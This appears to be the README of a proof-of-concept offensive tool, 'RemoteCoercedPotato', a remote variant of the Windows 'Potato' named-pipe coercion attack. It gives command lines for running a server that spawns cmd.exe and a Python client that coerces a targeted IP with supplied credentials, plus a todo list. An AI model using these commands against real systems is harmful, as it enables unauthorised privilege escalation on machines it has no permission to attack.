# RemoteCoercedPotato
A POC of a Remote Coerced Patate, just for fun.

Usage : 

- Without random namedpipe (default) :

    > $ ./CoercedPotatoServer -c cmd.exe

    > python3 CoercedPotatoClient.py -u user -p password 127.0.0.1 [targeted_IP]


 - Without random namedpipe (given by CoercedPotatoServer output) : 
 
    > $ ./CoercedPotatoServer -c cmd.exe -r true 
        
    > python3 CoercedPotatoClient.py -n [randomnamedpipe] -u user -p password -r true 127.0.0.1 [targeted_IP] 


Todo : 

    - Random NamedPipe [DONE]
    
    - Implemention of MS-RPRN interfacce 
    
    - Creation a powershell of a bytecode version of the namedPipe server 
